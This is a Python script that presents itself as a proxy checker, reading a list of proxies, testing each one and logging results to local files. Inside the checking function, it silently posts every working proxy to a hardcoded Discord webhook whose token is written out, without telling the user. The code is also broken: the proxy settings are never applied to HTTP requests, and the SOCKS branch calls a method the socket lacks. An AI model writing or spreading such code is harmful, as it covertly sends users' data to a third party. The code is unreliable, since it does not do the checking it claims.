import requests
import os
from colorama import Fore, Style
import time
import json
import socks


def clear_files():
    open('Working.txt', 'w').close()
    open('NotWorking.txt', 'w').close()


def check_proxy(proxy):
    protocol = proxy.split(':')[0]
    ip = proxy.split(':')[1]
    port = proxy.split(':')[2]
    
    if protocol.lower() == 'socks5':
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket = socks.socksocket()
    else:
        proxies = {
            "https": f"{protocol}://{ip}:{port}",
            "http": f"{protocol}://{ip}:{port}"
        }
        socket = requests.Session()

    try:
        res = socket.get('https://controlc.com/03ca46ed', timeout=5)
        if res.status_code == 200:
            print(f"{Fore.GREEN}[+] {Style.RESET_ALL}{proxy} is working!")
            with open('Working.txt', 'a') as f:
                f.write(proxy + '\n')
                
            data = {
                "content": f"{proxy}"
            }
            requests.post("https://discord.com/api/webhooks/1100494337072181318/ZsqkSpgionH9WIb9S4ntQd8gmrUrXn5qcdHw_C6FQtCiMdcP4XSjBLTXtXuXpbq8dWfr", data=data)
            
        else:
            print(f"{Fore.RED}[-] {Style.RESET_ALL}{proxy} is not working!")
            with open('NotWorking.txt', 'a') as f:
                f.write(proxy + '\n')
                
    except Exception as e:
        print(f"{Fore.RED}[-] {Style.RESET_ALL}{proxy} is not working! Error: {str(e).split(':')[-1].strip()}")
        with open('NotWorking.txt', 'a') as f:
            f.write(proxy + '\n')
            
    socket.close()


def main():
    clear_files()
    proxies = []

    with open('Proxies.txt', 'r') as f:
        proxies = [x.strip() for x in f.readlines()]

    if not proxies:
        print(f"{Fore.RED}[!] {Style.RESET_ALL}Error, Proxies.txt is empty!")
        return

    print(f"{Fore.YELLOW}[i] {Style.RESET_ALL}Loaded {len(proxies)} proxies from Proxies.txt\n")

    clear = input(f"{Fore.BLUE}[?] {Style.RESET_ALL}Do you want to clear the contents of the output files? (y/n): ")
    if clear.lower() == 'y':
        clear_files()
        print(f"{Fore.YELLOW}[i] {Style.RESET_ALL}Output files cleared!\n")

    for proxy in proxies:
        check_proxy(proxy)
        time.sleep(1)


if __name__ == '__main__':
    main()
